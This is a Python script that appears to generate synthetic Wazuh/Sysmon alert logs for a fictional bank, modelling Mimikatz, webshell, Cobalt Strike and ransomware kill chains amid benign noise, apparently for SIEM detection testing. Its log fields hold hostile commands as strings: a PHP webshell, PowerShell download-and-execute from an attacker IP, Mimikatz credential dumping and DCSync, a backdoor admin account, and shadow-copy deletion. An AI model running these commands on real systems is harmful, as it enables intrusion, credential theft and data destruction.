"""
EDR / Sysmon log generator — fully correlated per-incident kill chains.

Produces one JSON blob per event in Wazuh's OpenSearch format.
Each incident drives a complete scenario matched to victim_priv:

  admin   -> Mimikatz credential dump kill chain
  service -> Webshell + reverse shell kill chain
  manager -> Cobalt Strike C2 beacon kill chain
  user    -> Ransomware download + encryption kill chain

EVERY event carries:
  - data.win.eventdata.user      (BANK\\victim_user)
  - data.win.eventdata.ipAddress (attacker_ip)  <- links to other log sources
  - rule.level >= 10             <- ensures Wazuh indexes it as an alert
  - agent.name                   (victim_host short)

Baseline noise: normal process activity (low rule.level = 3-5, no attacker IP)
60/40 split is enforced by the ratio parameter.
"""
import random
import json
from datetime import datetime, timedelta
from pathlib import Path
from .common import pick, rand_recent, INTERNAL_IPS, pick_normal_user, HOSTS_WS
from .shared_state import INCIDENTS

RULE_GROUPS_SYSMON = ["windows", "sysmon", "sysmon_event1"]
RULE_GROUPS_FIM    = ["windows", "sysmon", "sysmon_event11"]
RULE_GROUPS_NET    = ["windows", "sysmon", "sysmon_event3"]
RULE_GROUPS_REG    = ["windows", "sysmon", "sysmon_event13"]


def _make_event(ts, victim_host_short, agent_ip, rule_id, rule_level,
                rule_desc, groups, eventdata: dict) -> tuple:
    """Build a complete Wazuh-style alert JSON. Returns (ts, dict)."""
    ev = {
        "timestamp": ts.strftime("%Y-%m-%dT%H:%M:%S.") + f"{ts.microsecond//1000:03d}Z",
        "agent": {"id": str(random.randint(1, 20)).zfill(3),
                  "name": victim_host_short, "ip": agent_ip},
        "manager": {"name": "wazuh-manager"},
        "rule": {
            "id":    str(rule_id),
            "level": rule_level,
            "description": rule_desc,
            "groups": groups,
        },
        "data": {
            "win": {
                "system": {
                    "providerName": "Microsoft-Windows-Sysmon",
                    "eventID": str(rule_id % 20 + 1),
                    "computer": f"{victim_host_short}.bank.local",
                    "systemTime": ts.strftime("%Y-%m-%dT%H:%M:%S.") + f"{ts.microsecond:06d}Z",
                    "eventRecordID": str(random.randint(100000, 999999)),
                },
                "eventdata": eventdata,
            }
        },
        "location": "EventChannel",
        "decoder": {"name": "windows_eventchannel"},
    }
    return (ts, ev)


# ---------------------------------------------------------------------------
# Reusable low-level event builders (all carry victim + attacker context)
# ---------------------------------------------------------------------------
def _process_create(ts, victim_user, victim_host_short, agent_ip, attacker_ip,
                    image, cmdline, parent_image, rule_id=100001,
                    rule_level=12, rule_desc="Suspicious process creation"):
    return _make_event(ts, victim_host_short, agent_ip, rule_id, rule_level,
                       rule_desc, RULE_GROUPS_SYSMON, {
        "user":            f"BANK\\{victim_user}",
        "ipAddress":       attacker_ip,   # <-- KEY: links to other log sources
        "image":           image,
        "commandLine":     cmdline,
        "parentImage":     parent_image,
        "processId":       str(random.randint(1000, 9999)),
        "parentProcessId": str(random.randint(1000, 9999)),
        "hashes":          "SHA256=" + "".join(random.choices("0123456789abcdef", k=64)),
    })


def _file_create(ts, victim_user, victim_host_short, agent_ip, attacker_ip,
                 filepath, rule_id=100002, rule_level=10,
                 rule_desc="Suspicious file created"):
    return _make_event(ts, victim_host_short, agent_ip, rule_id, rule_level,
                       rule_desc, RULE_GROUPS_FIM, {
        "user":      f"BANK\\{victim_user}",
        "ipAddress": attacker_ip,
        "targetFilename": filepath,
        "creationUtcTime": ts.strftime("%Y-%m-%dT%H:%M:%S.000Z"),
    })


def _network_connect(ts, victim_user, victim_host_short, agent_ip, attacker_ip,
                     dst_port=443, protocol="tcp",
                     rule_id=100003, rule_level=12,
                     rule_desc="Suspicious outbound network connection"):
    return _make_event(ts, victim_host_short, agent_ip, rule_id, rule_level,
                       rule_desc, RULE_GROUPS_NET, {
        "user":            f"BANK\\{victim_user}",
        "ipAddress":       attacker_ip,
        "destinationIp":   attacker_ip,
        "destinationPort": str(dst_port),
        "protocol":        protocol,
        "initiated":       "true",
    })


def _registry_set(ts, victim_user, victim_host_short, agent_ip, attacker_ip,
                  regkey, rule_id=100004, rule_level=10,
                  rule_desc="Persistence via registry key set"):
    return _make_event(ts, victim_host_short, agent_ip, rule_id, rule_level,
                       rule_desc, RULE_GROUPS_REG, {
        "user":    f"BANK\\{victim_user}",
        "ipAddress": attacker_ip,
        "targetObject": regkey,
        "details":      "C:\\Windows\\Temp\\payload.exe",
    })


# ---------------------------------------------------------------------------
# Per-privilege kill chains
# ---------------------------------------------------------------------------
def _chain_mimikatz(base, inc, events):
    """admin victim: credential dump chain (8 events)."""
    u  = inc["victim_user"]
    h  = inc["victim_host"].split(".")[0]
    ip = inc["attacker_ip"]
    ag = "10.20.0." + str(random.randint(10, 50))
    off = 0
    for image, cmdline, rid, rlv, rdesc in [
        ("C:\\Windows\\System32\\cmd.exe",
         "cmd.exe /c powershell -enc SQBFAFgA",
         61001, 12, "Encoded PowerShell execution (LOLBIN)"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA",
         61002, 13, "PowerShell encoded command - credential theft"),
        ("C:\\Windows\\Temp\\mimi.exe",
         "mimi.exe sekurlsa::logonpasswords",
         61003, 15, "Mimikatz credential dump detected"),
        ("C:\\Windows\\System32\\lsass.exe",
         "lsass.exe",
         61004, 15, "LSASS memory access - credential dumping"),
        ("C:\\Windows\\System32\\net.exe",
         "net group \"Domain Admins\" /domain",
         61005, 12, "Domain admin enumeration"),
        ("C:\\Windows\\Temp\\mimi.exe",
         "mimi.exe lsadump::dcsync /user:krbtgt",
         61006, 15, "DCSync attack detected - golden ticket prep"),
    ]:
        ts = base + timedelta(seconds=off)
        events.append(_process_create(ts, u, h, ag, ip, image, cmdline,
                                       "C:\\Windows\\explorer.exe",
                                       rule_id=rid, rule_level=rlv, rule_desc=rdesc))
        off += random.randint(8, 20)
    # persistence via registry run key
    ts = base + timedelta(seconds=off)
    events.append(_registry_set(ts, u, h, ag, ip,
        "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityUpdate",
        rule_id=61007, rule_level=12, rule_desc="Persistence via Run key"))
    # C2 callback
    ts = base + timedelta(seconds=off + 15)
    events.append(_network_connect(ts, u, h, ag, ip, dst_port=443,
        rule_id=61008, rule_level=13, rule_desc="C2 beacon outbound - post Mimikatz"))


def _chain_webshell(base, inc, events):
    """service victim: webshell + reverse shell chain (8 events)."""
    u  = inc["victim_user"]
    h  = inc["victim_host"].split(".")[0]
    ip = inc["attacker_ip"]
    ag = "10.20.2." + str(random.randint(10, 30))
    off = 0
    for image, cmdline, rid, rlv, rdesc in [
        ("C:\\Windows\\System32\\cmd.exe",
         "cmd.exe /c echo ^<?php system($_GET['cmd']); ?^> > C:\\inetpub\\wwwroot\\shell.php",
         62001, 14, "Webshell written to web root"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://" + ip + "/x.ps1')\"",
         62002, 14, "PowerShell downloads payload from attacker C2"),
        ("C:\\Windows\\System32\\cmd.exe",
         "cmd.exe /c whoami /priv",
         62003, 11, "Post-exploitation recon via cmd.exe"),
        ("C:\\Windows\\System32\\net.exe",
         "net user backdoor Pa$$w0rd! /add",
         62004, 14, "Backdoor user account created"),
        ("C:\\Windows\\System32\\net.exe",
         "net localgroup administrators backdoor /add",
         62005, 15, "Backdoor user added to local admins"),
    ]:
        ts = base + timedelta(seconds=off)
        events.append(_process_create(ts, u, h, ag, ip, image, cmdline,
                                       "C:\\Windows\\System32\\w3wp.exe",
                                       rule_id=rid, rule_level=rlv, rule_desc=rdesc))
        off += random.randint(10, 25)
    # file drop
    ts = base + timedelta(seconds=off)
    events.append(_file_create(ts, u, h, ag, ip,
        "C:\\inetpub\\wwwroot\\shell.php",
        rule_id=62006, rule_level=14, rule_desc="PHP webshell file created in web root"))
    # reverse shell network event
    ts = base + timedelta(seconds=off + 10)
    events.append(_network_connect(ts, u, h, ag, ip, dst_port=4444,
        rule_id=62007, rule_level=15, rule_desc="Reverse shell outbound connection"))
    # ransomware encryption starts
    ts = base + timedelta(seconds=off + 20)
    events.append(_file_create(ts, u, h, ag, ip,
        "C:\\Users\\Public\\DECRYPT_INSTRUCTIONS.txt",
        rule_id=62008, rule_level=15, rule_desc="Ransomware ransom note created"))


def _chain_cobalt_strike(base, inc, events):
    """manager victim: Cobalt Strike C2 beacon chain (8 events)."""
    u  = inc["victim_user"]
    h  = inc["victim_host"].split(".")[0]
    ip = inc["attacker_ip"]
    ag = "10.10." + str(random.randint(1, 5)) + "." + str(random.randint(10, 250))
    off = 0
    for image, cmdline, rid, rlv, rdesc in [
        ("C:\\Users\\" + u + "\\AppData\\Local\\Temp\\invoice.exe",
         "invoice.exe",
         63001, 12, "Suspicious executable from Downloads/Temp"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "powershell -w hidden -c \"$c=New-Object System.Net.WebClient;$c.DownloadFile('http://" + ip + "/beacon.exe','C:\\Windows\\Temp\\svchost32.exe')\"",
         63002, 14, "Cobalt Strike stager download"),
        ("C:\\Windows\\Temp\\svchost32.exe",
         "svchost32.exe -pipe",
         63003, 15, "Cobalt Strike beacon process"),
        ("C:\\Windows\\System32\\cmd.exe",
         "cmd.exe /c ipconfig /all && net view && arp -a",
         63004, 11, "Network reconnaissance commands"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "powershell -c \"Invoke-Mimikatz -DumpCreds\"",
         63005, 15, "In-memory credential dumping"),
    ]:
        ts = base + timedelta(seconds=off)
        events.append(_process_create(ts, u, h, ag, ip, image, cmdline,
                                       "C:\\Windows\\explorer.exe",
                                       rule_id=rid, rule_level=rlv, rule_desc=rdesc))
        off += random.randint(15, 30)
    # repeated C2 beacons (3 network events = signature of beacon interval)
    for i in range(3):
        ts = base + timedelta(seconds=off + i * 60)
        events.append(_network_connect(ts, u, h, ag, ip, dst_port=443,
            rule_id=63006, rule_level=13,
            rule_desc=f"Cobalt Strike beacon #{i+1} - periodic C2 callback"))


def _chain_ransomware(base, inc, events):
    """user victim: drive-by download + ransomware chain (8 events)."""
    u  = inc["victim_user"]
    h  = inc["victim_host"].split(".")[0]
    ip = inc["attacker_ip"]
    ag = "10.10." + str(random.randint(6, 15)) + "." + str(random.randint(10, 250))
    off = 0
    for image, cmdline, rid, rlv, rdesc in [
        ("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
         f"chrome.exe --download-url=http://{ip}/invoice_{random.randint(1000,9999)}.exe",
         64001, 10, "Browser downloads suspicious executable"),
        ("C:\\Users\\" + u + "\\Downloads\\invoice.exe",
         "invoice.exe /silent",
         64002, 13, "Suspicious executable launched from Downloads"),
        ("C:\\Windows\\System32\\vssadmin.exe",
         "vssadmin delete shadows /all /quiet",
         64003, 15, "VSS shadow copy deletion - ransomware pre-encryption"),
        ("C:\\Windows\\System32\\cmd.exe",
         "cmd.exe /c wmic shadowcopy delete",
         64004, 15, "WMI shadow copy deletion"),
        ("C:\\Users\\" + u + "\\Downloads\\invoice.exe",
         "invoice.exe --encrypt C:\\Users --key xor",
         64005, 15, "Ransomware file encryption process"),
    ]:
        ts = base + timedelta(seconds=off)
        events.append(_process_create(ts, u, h, ag, ip, image, cmdline,
                                       "C:\\Windows\\explorer.exe",
                                       rule_id=rid, rule_level=rlv, rule_desc=rdesc))
        off += random.randint(10, 20)
    # C2 registration
    ts = base + timedelta(seconds=off)
    events.append(_network_connect(ts, u, h, ag, ip, dst_port=443,
        rule_id=64006, rule_level=14, rule_desc="Ransomware C2 registration"))
    # ransom note dropped
    ts = base + timedelta(seconds=off + 5)
    events.append(_file_create(ts, u, h, ag, ip,
        "C:\\Users\\Public\\Desktop\\YOUR_FILES_ARE_ENCRYPTED.txt",
        rule_id=64007, rule_level=15, rule_desc="Ransomware ransom note dropped"))
    # ongoing encryption file activity
    ts = base + timedelta(seconds=off + 10)
    events.append(_file_create(ts, u, h, ag, ip,
        f"C:\\Users\\{u}\\Documents\\accounts.xlsx.locked",
        rule_id=64008, rule_level=15, rule_desc="Ransomware file encryption activity"))


CHAIN_BY_PRIV = {
    "admin":   _chain_mimikatz,
    "service": _chain_webshell,
    "manager": _chain_cobalt_strike,
    "user":    _chain_ransomware,
    "vendor":  _chain_webshell,    # vendors treated like service compromise
}


# ---------------------------------------------------------------------------
# Baseline noise events (low rule.level, no attacker IP, normal users)
# ---------------------------------------------------------------------------
def _baseline_events(count, events):
    normal_procs = [
        ("C:\\Windows\\System32\\svchost.exe",   "svchost.exe -k netsvcs",      3, "Normal service host process"),
        ("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                                                  "chrome.exe",                  3, "Browser process"),
        ("C:\\Windows\\System32\\WindowsUpdateClient\\wuauclt.exe",
                                                  "wuauclt.exe /runhandler",      4, "Windows Update client"),
        ("C:\\Windows\\System32\\msiexec.exe",    "msiexec.exe /quiet /i app.msi",5,"Software installation"),
        ("C:\\Windows\\explorer.exe",             "explorer.exe",                 3, "Explorer normal"),
        ("C:\\Windows\\System32\\taskhostw.exe",  "taskhostw.exe",               3, "Task host normal"),
        ("C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE",
                                                  "WINWORD.EXE /r",              3, "Word document opened"),
        ("C:\\Windows\\System32\\cmd.exe",        "cmd.exe /c ipconfig",         4, "Admin checking IP config"),
    ]
    for _ in range(count):
        ts = rand_recent(60)
        image, cmdline, rlv, rdesc = pick(normal_procs)
        user = pick_normal_user()
        host = pick(HOSTS_WS).split(".")[0]
        agent_ip = "10.10." + str(random.randint(1, 15)) + "." + str(random.randint(10, 250))
        ev = _make_event(ts, host, agent_ip,
                         100 + random.randint(0, 50), rlv, rdesc,
                         RULE_GROUPS_SYSMON, {
            "user":      f"BANK\\{user['username']}",
            "image":     image,
            "commandLine": cmdline,
            "parentImage": "C:\\Windows\\System32\\services.exe",
        })
        events.append(ev)


# ---------------------------------------------------------------------------
# Main generator
# ---------------------------------------------------------------------------
def generate(output_path, count: int = 60, normal_ratio: float = 0.60) -> None:
    all_events = []
    scenarios_used = []

    # ---- Attack chains (incident-driven) ----
    for inc in INCIDENTS:
        priv   = inc.get("victim_priv", "user")
        chain  = CHAIN_BY_PRIV.get(priv, _chain_ransomware)
        base   = rand_recent(30)
        chain(base, inc, all_events)
        scenarios_used.append(
            f"{priv:<10} {chain.__name__:<25} {inc['attacker_ip']:>16} "
            f"-> {inc['victim_user']}@{inc['victim_host'].split('.')[0]}")

    attack_count = len(all_events)

    # ---- Baseline (60% of total by default) ----
    # total = attack / (1 - ratio)  →  baseline = total - attack
    total_target  = int(attack_count / (1 - normal_ratio))
    baseline_need = total_target - attack_count
    _baseline_events(max(baseline_need, count), all_events)

    # Sort and write
    all_events.sort(key=lambda x: x[0])
    with open(output_path, "w") as f:
        for ts, ev in all_events:
            f.write(json.dumps(ev) + "\n")

    total = len(all_events)
    print(f"  wrote {total} EDR events -> {Path(output_path).name}")
    print(f"  attack events:   {attack_count} ({attack_count/total*100:.0f}%)")
    print(f"  baseline events: {total-attack_count} ({(total-attack_count)/total*100:.0f}%)")
    print(f"  correlated kill-chains: {len(scenarios_used)}")
    for s in scenarios_used:
        print(f"    {s}")
